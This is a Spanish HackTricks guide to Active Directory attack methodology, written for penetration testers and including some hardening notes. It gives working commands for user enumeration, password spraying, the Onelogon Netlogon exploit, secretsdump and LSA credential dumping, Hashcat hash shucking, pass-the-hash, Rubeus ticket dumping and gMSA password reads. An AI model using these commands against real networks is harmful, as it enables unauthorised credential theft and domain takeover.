# Metodología de Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Descripción general básica

**Active Directory** sirve como una tecnología fundamental que permite a los **administradores de red** crear y gestionar eficientemente **dominios**, **usuarios** y **objetos** dentro de una red. Está diseñado para escalar, facilitando la organización de un gran número de usuarios en **grupos** y **subgrupos** manejables, mientras controla los **derechos de acceso** en varios niveles.

La estructura de **Active Directory** está compuesta por tres capas principales: **dominios**, **árboles** y **bosques**. Un **dominio** engloba una colección de objetos, como **usuarios** o **dispositivos**, que comparten una base de datos común. Los **árboles** son grupos de estos dominios vinculados mediante una estructura compartida, y un **bosque** representa la colección de varios árboles interconectados mediante **relaciones de confianza**, formando la capa superior de la estructura organizativa. Se pueden designar **derechos de acceso** y **comunicación** específicos en cada uno de estos niveles.

Los conceptos clave dentro de **Active Directory** incluyen:

1. **Directorio** – Contiene toda la información relacionada con los objetos de Active Directory.
2. **Objeto** – Denota las entidades dentro del directorio, incluidos **usuarios**, **grupos** o **carpetas compartidas**.
3. **Dominio** – Sirve como contenedor para los objetos del directorio, con la capacidad de que varios dominios coexistan dentro de un **bosque**, manteniendo cada uno su propia colección de objetos.
4. **Árbol** – Una agrupación de dominios que comparten un dominio raíz común.
5. **Bosque** – El nivel superior de la estructura organizativa en Active Directory, compuesto por varios árboles con **relaciones de confianza** entre ellos.

**Active Directory Domain Services (AD DS)** engloba una serie de servicios esenciales para la gestión centralizada y la comunicación dentro de una red. Estos servicios incluyen:

1. **Servicios de dominio** – Centralizan el almacenamiento de datos y gestionan las interacciones entre **usuarios** y **dominios**, incluidas las funcionalidades de **autenticación** y **búsqueda**.
2. **Servicios de certificados** – Supervisan la creación, distribución y gestión de **certificados digitales** seguros.
3. **Servicios de directorio ligero** – Admiten aplicaciones habilitadas para directorios mediante el **protocolo LDAP**.
4. **Servicios de federación de directorios** – Proporcionan capacidades de **single sign-on** para autenticar usuarios en varias aplicaciones web durante una única sesión.
5. **Gestión de derechos** – Ayuda a proteger material sujeto a copyright regulando su distribución y uso no autorizados.
6. **Servicio DNS** – Esencial para la resolución de **nombres de dominio**.

Para obtener una explicación más detallada, consulta: [**TechTerms - Definición de Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender a **atacar un AD**, necesitas **comprender** muy bien el **proceso de autenticación de Kerberos**.\
[**Lee esta página si todavía no sabes cómo funciona.**](kerberos-authentication.md)

## Cheat Sheet

Puedes consultar [https://wadcoms.github.io/](https://wadcoms.github.io) para obtener una vista rápida de los comandos que puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> La comunicación de Kerberos normalmente **requiere un nombre de dominio completamente cualificado (FQDN)** para que el cliente pueda obtener un ticket para el SPN correcto. Acceder a una máquina mediante su dirección IP suele hacer que se utilice NTLM en lugar de Kerberos.

## Reconocimiento de Active Directory (sin creds/sesiones)

Si solo tienes acceso a un entorno de AD, pero no tienes credenciales/sesiones, podrías:

- **Hacer pentesting de la red:**
- Escanear la red, encontrar máquinas y puertos abiertos, e intentar **explotar vulnerabilidades** o **extraer credenciales** de ellas (por ejemplo, [las impresoras pueden ser objetivos muy interesantes](ad-information-in-printers.md)).
- Enumerar DNS podría proporcionar información sobre servidores clave del dominio, como web, impresoras, shares, VPN, multimedia, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulta la [**Metodología general de pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) para obtener más información sobre cómo hacerlo.
- **Comprobar el acceso null y Guest en los servicios SMB** (esto no funcionará en versiones modernas de Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Aquí se puede encontrar una guía más detallada sobre cómo enumerar un servidor SMB:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Aquí se puede encontrar una guía más detallada sobre cómo enumerar LDAP (presta **especial atención al acceso anónimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenenar la red**
- Recopilar credenciales [**suplantando servicios con Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acceder al host [**abusando del relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Recopilar credenciales **exponiendo** [**servicios UPnP falsos con evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extraer nombres de usuario/nombres de documentos internos, redes sociales y servicios (principalmente web) dentro de los entornos del dominio, así como de fuentes disponibles públicamente.
- Si encuentras los nombres completos de los empleados de una empresa, podrías probar diferentes **convenciones de nombres de usuario de AD (**[**lee esto**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada uno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, _3 letras aleatorias y 3 números aleatorios_ (abc123).
- Herramientas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeración de usuarios

- **Enumeración SMB/LDAP anónima:** Consulta las páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeración con Kerbrute**: Cuando se solicita un **nombre de usuario no válido**, el servidor responderá utilizando el código de **error de Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que permite determinar que el nombre de usuario no era válido. Los **nombres de usuario válidos** provocarán una respuesta con el **TGT** en una respuesta AS-REP o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que el usuario debe realizar la preautenticación.
- **Sin autenticación contra MS-NRPC**: Uso de auth-level = 1 (sin autenticación) contra la interfaz MS-NRPC (Netlogon) de los controladores de dominio. El método llama a la función `DsrGetDcNameEx2` después de enlazar con la interfaz MS-NRPC para comprobar si el usuario o el equipo existe sin credenciales. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación se puede consultar [aquí](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si encuentras uno de estos servidores en la red, también puedes realizar **user enumeration contra él**. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puedes encontrar listas de nombres de usuario en [**este repositorio de github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) y en este otro ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener los **nombres de las personas que trabajan en la empresa**, obtenidos durante el paso de reconnaissance que deberías haber realizado previamente. Con el nombre y el apellido, podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles nombres de usuario válidos.

### Abuso de la allow-list del canal vulnerable de Netlogon (Onelogon)

Incluso después de aplicar el parche de **Zerologon** en el DC, las cuentas incluidas explícitamente en la allow-list aún pueden quedar expuestas al comportamiento **legacy/vulnerable del canal seguro de Netlogon**. La configuración de riesgo es la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o el valor de registro equivalente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ese valor es un **descriptor de seguridad SDDL** (consulta [Security Descriptors](security-descriptors.md)). Cualquier cuenta o grupo al que se le haya concedido la ACE correspondiente en la DACL puede ser objetivo. Por ejemplo, `O:BAG:BAD:(A;;RC;;;WD)` incluye efectivamente en la allow-list a **Everyone**.

Flujo de trabajo práctico del operador:

1. **Identificar los principals incluidos en la allow-list** comprobando tanto **SYSVOL/GPO** como el registro activo del **DC**.
2. **Resolver los SID** encontrados en el SDDL para convertirlos en usuarios/equipos reales de AD y priorizar las **cuentas de equipo de los DC**, las **cuentas de confianza** y otras máquinas privilegiadas.
3. Intentar repetidamente la **autenticación MS-NRPC / Netlogon** como la cuenta incluida en la allow-list.
4. Tras acertar correctamente, abusar de **Netlogon password-setting** para restablecer la contraseña de la cuenta objetivo (el PoC público la establece como una cadena vacía).<sup>[[9]](#references)[[10]](#references)</sup>

Ejemplos rápidos de triage / laboratorio a partir del artifact público:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notas:

- El **scanner** es útil porque la allow-list efectiva puede existir en **SYSVOL**, en el **registry** o en ambos.
- La propia ruta de exploit es importante porque **no requiere privilegios de Domain Admin** una vez identificada una cuenta vulnerable.
- Comprometer una **cuenta de máquina de un Domain Controller**, como `DC$`, es especialmente peligroso porque restablecer esa contraseña puede habilitar directamente rutas más amplias de **AD takeover**.
- La viabilidad del **brute force** depende del modo: el artefacto público describe un enfoque meet-in-the-middle, un **brute force de 24 bits** cuando hay otra cuenta de equipo disponible y variantes de **32 bits** más lentas.

Notas de detección / hardening:

- Audita la política de allow-list y elimina todo excepto las excepciones de compatibilidad temporales y explícitamente necesarias.
- Monitoriza los eventos **5827/5828/5829/5830/5831** del **System** del DC para detectar conexiones Netlogon vulnerables que sean rechazadas, descubiertas o permitidas explícitamente por la política.
- Trata las cuentas de `VulnerableChannelAllowList` como de **alto riesgo** hasta eliminar la dependencia legacy.

### Conocer uno o varios nombres de usuario

Bien, sabes que ya tienes un nombre de usuario válido, pero no tienes contraseñas... Entonces prueba lo siguiente:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_, puedes **solicitar un mensaje AS_REP** para ese usuario que contendrá algunos datos cifrados mediante una derivación de la contraseña del usuario.
- [**Password Spraying**](password-spraying.md): Probemos las **contraseñas más comunes** con cada uno de los usuarios descubiertos; quizá algún usuario esté utilizando una contraseña débil (¡ten en cuenta la política de contraseñas!).
- Ten en cuenta que también puedes hacer **spraying contra servidores OWA** para intentar obtener acceso a los servidores de correo de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Es posible que puedas **obtener** algunos **hashes** de challenge haciendo **poisoning** de ciertos protocolos de la **red**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

La enumeración de Active Directory proporciona nombres de usuario, identificadores de email y patrones de nomenclatura, hosts candidatos y servicios que pueden ser forzados a autenticarse. Utiliza ese contexto para identificar [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) de NTLM viables y posibles rutas hacia el entorno de AD.

### Recon de NetExec basado en workspaces y comprobaciones de relay posture

- Utiliza **`nxcdb` workspaces** para mantener el estado del recon de AD por engagement: `workspace create <name>` genera bases de datos SQLite por protocolo en `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia las vistas con `proto smb|mssql|winrm` y lista los secrets recopilados con `creds`. Elimina manualmente los datos sensibles al terminar: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- El descubrimiento rápido de subredes con **`netexec smb <cidr>`** muestra **domain**, **OS build**, **SMB signing requirements** y **Null Auth**. Los miembros que muestran `(signing:False)` son **relay-prone**, mientras que los DC suelen requerir signing.
- Genera **hostnames en /etc/hosts** directamente a partir de la salida de NetExec para facilitar el targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Cuando **SMB relay al DC está bloqueado** debido a signing, sigue comprobando la configuración de **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / un channel binding débil. Un DC con SMB signing obligatorio pero con LDAP signing deshabilitado sigue siendo un objetivo viable de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Filtraciones de credenciales de impresoras del lado del cliente → validación masiva de credenciales del dominio

- En ocasiones, las interfaces web de las impresoras **incluyen contraseñas de administrador enmascaradas en HTML**. Ver el código fuente o usar las herramientas de desarrollo puede revelar el texto claro (por ejemplo, `<input value="<password>">`), lo que permite acceder mediante Basic-auth a repositorios de escaneo/impresión.
- Los trabajos de impresión recuperados pueden contener **documentos de onboarding en texto claro** con contraseñas por usuario. Mantén alineadas las correspondencias al realizar las pruebas:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Robar credenciales NTLM

Si puedes **acceder a otros PCs o recursos compartidos** con el **usuario null o guest**, podrías **colocar archivos** (como un archivo SCF) que, si son accedidos de alguna forma, **desencadenen una autenticación NTLM contra ti**, permitiéndote **robar** el **desafío NTLM** para crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada hash NT que ya posees como una contraseña candidata para otros formatos más lentos cuyo material de clave se deriva directamente del hash NT. En lugar de aplicar fuerza bruta a passphrases largas en tickets Kerberos RC4, desafíos NetNTLM o credenciales en caché, proporcionas los hashes NT a los modos NT-candidate de Hashcat y permites que valide la reutilización de contraseñas sin conocer nunca el texto plano. Esto es especialmente potente después de comprometer un dominio, cuando puedes recopilar miles de hashes NT actuales e históricos.<sup>[[5]](#references)</sup>

Usa shucking cuando:

- Tienes un corpus NT procedente de volcados de DCSync, SAM/SECURITY o credential vaults y necesitas comprobar su reutilización en otros dominios/bosques.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respuestas NetNTLM o blobs DCC/DCC2.
- Quieres demostrar rápidamente la reutilización de passphrases largas imposibles de crackear y pivotar inmediatamente mediante Pass-the-Hash.

La técnica **no funciona** contra tipos de cifrado cuyas claves no son el hash NT (por ejemplo, Kerberos etype 17/18 AES). Si un dominio aplica únicamente AES, debes volver a los modos de contraseña normales.

#### Construir un corpus de hashes NT

- **DCSync/NTDS**: usa `secretsdump.py` con el historial para obtener el conjunto más grande posible de hashes NT (y sus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Las entradas del historial amplían considerablemente el conjunto de candidatos porque Microsoft puede almacenar hasta 24 hashes anteriores por cuenta. Para conocer más formas de obtener secretos de NTDS, consulta:

{{#ref}}
dcsync.md
{{#endref}}

- **Volcados de caché de endpoints**: `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos SAM/SECURITY locales y logons de dominio en caché (DCC/DCC2). Elimina duplicados y añade esos hashes a la misma lista `nt_candidates.txt`.
- **Rastrea los metadatos**: conserva el username/domain que produjo cada hash (aunque la wordlist contenga únicamente hexadecimal). Los hashes coincidentes te indican inmediatamente qué principal está reutilizando una contraseña cuando Hashcat muestre el candidato ganador.
- Da preferencia a candidatos del mismo bosque o de un bosque de confianza; esto maximiza la probabilidad de coincidencia al realizar shucking.

#### Modos NT-candidate de Hashcat

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- Las entradas NT-candidate **deben mantenerse como hashes NT sin procesar de 32 caracteres hexadecimales**. Desactiva los motores de reglas (sin `-r` ni modos híbridos), ya que modificar el material de la clave candidata lo corrompe.
- Estos modos no son inherentemente más rápidos, pero el keyspace de NTLM (~30.000 MH/s en un M3 Max) es ~100 veces más rápido que Kerberos RC4 (~300 MH/s). Probar una lista NT seleccionada es mucho más económico que explorar todo el espacio de contraseñas en el formato lento.
- Ejecuta siempre la **versión más reciente de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), porque los modos 31500/31600/35300/35400 se incorporaron recientemente.<sup>[[7]](#references)</sup>
- Actualmente no existe un modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la contraseña en texto plano porque sus claves se derivan mediante PBKDF2 a partir de contraseñas UTF-16LE, no de hashes NT sin procesar.

#### Ejemplo – Kerberoast RC4 (modo 35300)

1. Captura un TGS RC4 para un SPN objetivo con un usuario con pocos privilegios (consulta la página de Kerberoast para obtener más detalles):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Realiza shucking del ticket con tu lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la clave RC4 de cada candidato NT y valida el blob `$krb5tgs$23$...`. Una coincidencia confirma que la cuenta de servicio utiliza uno de tus hashes NT existentes.

3. Realiza inmediatamente un pivot mediante PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente, puedes recuperar el texto plano más adelante con `hashcat -m 1000 <matched_hash> wordlists/` si es necesario.

#### Ejemplo – Credenciales en caché (modo 31600)

1. Extrae los logons en caché de una workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la línea DCC2 del usuario del dominio relevante en `dcc2_highpriv.txt` y realiza shucking:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una coincidencia exitosa proporciona el hash NT ya conocido en tu lista, demostrando que el usuario en caché está reutilizando una contraseña. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o aplica fuerza bruta en el modo NTLM rápido para recuperar la cadena.

El mismo workflow exacto se aplica a challenge-responses NetNTLM (`-m 27000/27100`) y DCC (`-m 31500`). Una vez identificada una coincidencia, puedes lanzar relay, PtH mediante SMB/WMI/WinRM o volver a crackear el hash NT con masks/rules offline.



## Enumerar Active Directory CON credenciales/sesión

Para esta fase necesitas haber **comprometido las credenciales o una sesión de una cuenta de dominio válida**. Si tienes credenciales válidas o una shell como usuario de dominio, **debes recordar que las opciones indicadas anteriormente siguen siendo opciones para comprometer a otros usuarios**.

Antes de comenzar la enumeración autenticada, comprende el **problema del double-hop de Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeración

Comprometer una cuenta es un **paso importante para evaluar el dominio**, porque permite realizar una **enumeración autenticada de Active Directory**:

En cuanto a [**ASREPRoast**](asreproast.md), ahora puedes encontrar todos los usuarios potencialmente vulnerables y, en cuanto a [**Password Spraying**](password-spraying.md), puedes obtener una **lista de todos los usernames** e intentar la contraseña de la cuenta comprometida, contraseñas vacías y nuevas contraseñas prometedoras.

- Puedes usar [**CMD para realizar un reconocimiento básico**](../basic-cmd-for-pentesters.md#domain-info)
- También puedes usar [**powershell para reconocimiento**](../basic-powershell-for-pentesters/index.html), lo que será más sigiloso
- También puedes [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extraer información más detallada
- Otra herramienta excelente para realizar reconocimiento en un active directory es [**BloodHound**](bloodhound.md). **No es muy sigilosa** (dependiendo de los métodos de recopilación que uses), pero **si no te preocupa** esto, deberías probarla. Averigua dónde pueden hacer RDP los usuarios, encuentra rutas hacia otros grupos, etc.
- **Otras herramientas automatizadas de enumeración de AD son:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS del AD**](ad-dns-records.md), ya que podrían contener información interesante.
- Una **herramienta con GUI** que puedes usar para enumerar el directorio es **AdExplorer.exe**, de la suite **SysInternal**.
- También puedes buscar en la base de datos LDAP con **ldapsearch** para localizar credenciales en los campos _userPassword_ y _unixUserPassword_, o incluso en _Description_. Consulta [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para conocer otros métodos.
- Si usas **Linux**, también podrías enumerar el dominio mediante [**pywerview**](https://github.com/the-useless-one/pywerview).
- También puedes probar herramientas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracción de todos los usuarios del dominio**

Es muy fácil obtener todos los usernames del dominio desde Windows (`net user /domain`, `Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Aunque esta sección de Enumeration parezca pequeña, es la parte más importante de todas. Accede a los enlaces (principalmente los de cmd, powershell, powerview y BloodHound), aprende a enumerar un dominio y practica hasta sentirte cómodo. Durante una evaluación, este será el momento clave para encontrar el camino hacia DA o decidir que no se puede hacer nada.

### Cuentas de equipo precreadas predecibles -> acceso a la contraseña de gMSA

Las cuentas de equipo preparadas para incorporaciones legacy pueden conservar una contraseña inicial predecible. El módulo `pre2k` de NetExec identifica el valor característico `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) e intenta obtener un TGT de Kerberos con los primeros 14 caracteres del nombre del equipo en minúsculas, sin el `$` final. Trata este valor UAC como un selector de candidatos en lugar de asumir que pertenecer a **Pre-Windows 2000 Compatible Access** demuestra por sí solo que la contraseña es débil.<sup>[[18]](#references)[[20]](#references)</sup>

Usa la enumeración LDAP autenticada para probar los candidatos y guardar los TGT exitosos. `ALL=True` amplía las pruebas más allá de los objetos con el filtro predeterminado `4128`.<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
Un bind default/NTLM fallido **no** invalida este hallazgo: prueba con `-k`, un FQDN que resuelva al DC y un reloj sincronizado con el KDC. Las ejecuciones exitosas del módulo escriben listas de candidatos y ccaches adquiridos en `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Después de comprometer el principal de equipo, grafica sus membresías en grupos anidados y sus permisos salientes. En particular, los principales nombrados en el descriptor de seguridad `msDS-GroupMSAMembership` de un gMSA pueden leer `msDS-ManagedPassword`; la salida de `--gmsa` de NetExec muestra los principales autorizados y devuelve el hash NT actual cuando el equipo autenticador está autorizado.<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
Luego evalúa la gMSA recuperada como cualquier otra credencial: inspecciona la pertenencia a grupos locales/del dominio, los derechos de inicio de sesión, los SPN, la delegación y los servicios accesibles antes de intentar pass-the-hash. Esta vía de recuperación basada en ACL es distinta de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), que obtiene contraseñas administradas después de comprometer la clave raíz de KDS.<sup>[[20]](#references)</sup>

### Kerberoast

Kerberoasting consiste en obtener **TGS tickets** utilizados por servicios vinculados a cuentas de usuario y crackear su cifrado —que se basa en las contraseñas de los usuarios— **offline**.

Más información:

{{#ref}}
kerberoast.md
{{#endref}}

### Conexión remota (RDP, SSH, FTP, Win-RM, etc.)

Una vez que hayas obtenido algunas credenciales, puedes comprobar si tienes acceso a alguna **máquina**. Para ello, podrías utilizar **CrackMapExec** para intentar conectarte a varios servidores mediante distintos protocolos, según tus escaneos de puertos.

### Escalada local de privilegios

Si has comprometido credenciales o tienes una sesión como usuario normal del dominio y puedes acceder a **cualquier máquina del dominio**, busca una ruta para **escalar privilegios localmente y recopilar credenciales**. Los privilegios de administrador local pueden permitirte **hacer dump de los hashes de otros usuarios** desde la memoria (LSASS) y el almacenamiento local (SAM).

Hay una página completa en este libro sobre [**escalada local de privilegios en Windows**](../windows-local-privilege-escalation/index.html) y una [**checklist**](../checklist-windows-privilege-escalation.md). Además, no olvides utilizar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de la sesión actual

Es muy **poco probable** que encuentres **tickets** en el usuario actual que te **den permiso para acceder** a recursos inesperados, pero podrías comprobar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Con credenciales de dominio o una sesión de usuario, vuelve a revisar los [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) de NTLM: las técnicas de enumeración autenticada y coerción pueden exponer rutas de relay que no estaban disponibles durante el reconocimiento no autenticado.

### Looks for Creds in Computer Shares | SMB Shares

Ahora que tienes algunas credenciales básicas, deberías comprobar si puedes **encontrar** **archivos interesantes compartidos dentro del AD**. Podrías hacerlo manualmente, pero es una tarea muy aburrida y repetitiva (y más aún si encuentras cientos de documentos que necesitas revisar).

[**Sigue este enlace para conocer las herramientas que podrías usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si puedes **acceder a otros PCs o shares**, podrías **colocar archivos** (como un archivo SCF) que, si alguien accede a ellos, **desencadenen una autenticación NTLM contra ti**, lo que te permitirá **robar** el **NTLM challenge** para crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía a cualquier usuario autenticado **comprometer el domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para las siguientes técnicas, un usuario de dominio normal no es suficiente; necesitas privilegios/credenciales especiales para realizar estos ataques.**

### Hash extraction

Con suerte, has conseguido **comprometer alguna cuenta de admin local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluido el relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilegios localmente](../windows-local-privilege-escalation/index.html).\
Entonces, es hora de volcar todos los hashes de la memoria y del sistema local.\
[**Lee esta página sobre las diferentes formas de obtener los hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tienes el hash de un usuario**, puedes usarlo para **suplantarlo**.\
